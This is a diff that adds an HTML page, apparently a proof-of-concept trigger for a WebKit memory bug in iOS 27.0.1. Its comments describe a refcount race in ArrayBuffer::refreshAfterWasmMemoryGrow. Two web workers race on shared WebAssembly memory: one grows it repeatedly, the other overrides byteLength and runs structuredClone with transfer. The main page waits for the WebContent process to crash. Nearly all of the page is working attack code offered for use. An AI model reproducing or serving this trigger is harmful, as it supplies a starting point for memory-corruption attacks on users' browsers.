@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>P2 Deterministic Trigger</title>
+<style>
+body { background:#000; color:#0f0; font-family:monospace; font-size:12px; margin:0; padding:8px; }
+#log { white-space:pre-wrap; word-break:break-all; }
+</style>
+</head>
+<body>
+<div id="log">P2 trigger loading...</div>
+<script>
+(function(){
+"use strict";
+
+var LOG = document.getElementById('log');
+var t0 = Date.now();
+
+function log(msg) {
+  var line = '[' + ((Date.now()-t0)/1000).toFixed(3) + 's] ' + msg;
+  LOG.textContent += '\n' + line;
+}
+
+document.addEventListener('visibilitychange', function() {
+  if(document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
+});
+
+// P2: deterministic WASM-grow refcount race trigger
+// Target: iOS 27.0.1 WebKit.WebContent
+// Bug: ArrayBuffer::refreshAfterWasmMemoryGrow(Memory*) — refcount race during grow
+// Signature: x2=x13=0x80000000 (INT32_MIN wraparound)
+
+log('P2: building shared WASM memory...');
+
+var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
+var view = new Uint8Array(SHARED_MEM.buffer);
+
+log('P2: memory built, byteLength=' + SHARED_MEM.buffer.byteLength);
+
+// Worker: hammers grow() to trigger refreshAfterWasmMemoryGrow race
+var growSrc = [
+  'onmessage = function(e) {',
+  '  var mem = e.data;',
+  '  var n = 0;',
+  '  postMessage({type:"spawn", msg:"grow worker alive"});',
+  '  function grow() {',
+  '    try {',
+  '      mem.grow(1);',
+  '      n++;',
+  '      if(n % 100 === 0) postMessage({type:"grow", n:n});',
+  '    } catch(err) {',
+  '      postMessage({type:"growerr", msg:err.message});',
+  '      return;',
+  '    }',
+  '    setTimeout(grow, 0);',
+  '  }',
+  '  grow();',
+  '};'
+].join('\n');
+
+// Worker: structuredClone with transfer + byteLength getter override
+// This is the deterministic trigger — fires the refcount race
+var cloneSrc = [
+  'onmessage = function(e) {',
+  '  var mem = e.data;',
+  '  var n = 0;',
+  '  postMessage({type:"spawn", msg:"clone worker alive"});',
+  '  function clone() {',
+  '    try {',
+  '      var ab = mem.buffer;',
+  '      // Override byteLength to return huge value — triggers INT32_MIN wraparound',
+  '      Object.defineProperty(ab, "byteLength", {',
+  '        get: function() { return 0x7fffffff; },',
+  '        configurable: true',
+  '      });',
+  '      var ta = new Uint8Array(ab);',
+  '      structuredClone(ta, {transfer: [ab]});',
+  '      n++;',
+  '      if(n % 10 === 0) postMessage({type:"clone", n:n});',
+  '    } catch(err) {',
+  '      postMessage({type:"cloneerr", msg:err.message});',
+  '    }',
+  '    setTimeout(clone, 0);',
+  '  }',
+  '  clone();',
+  '};'
+].join('\n');
+
+var growBlob = new Blob([growSrc], {type:'application/javascript'});
+var cloneBlob = new Blob([cloneSrc], {type:'application/javascript'});
+var growURL = URL.createObjectURL(growBlob);
+var cloneURL = URL.createObjectURL(cloneBlob);
+
+var growWorker = new Worker(growURL);
+var cloneWorker = new Worker(cloneURL);
+
+growWorker.onmessage = function(e) {
+  if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
+  if(e.data.type === 'grow') log('grow n=' + e.data.n);
+  if(e.data.type === 'growerr') log('GROW ERROR: ' + e.data.msg);
+};
+
+cloneWorker.onmessage = function(e) {
+  if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
+  if(e.data.type === 'clone') log('clone n=' + e.data.n);
+  if(e.data.type === 'cloneerr') log('CLONE ERROR: ' + e.data.msg);
+};
+
+log('P2: spawning workers...');
+
+growWorker.postMessage(SHARED_MEM);
+cloneWorker.postMessage(SHARED_MEM);
+
+log('P2: workers spawned, waiting for race...');
+
+// Main thread: monitor for crash
+// If we get here without crashing after 30s, the race didn't fire
+setTimeout(function() {
+  log('P2: 30s elapsed, no crash — race did not fire');
+  log('P2: check Analytics for WebKit.WebContent crash logs');
+}, 30000);
+
+})();
+</script>
+</body>
+</html>
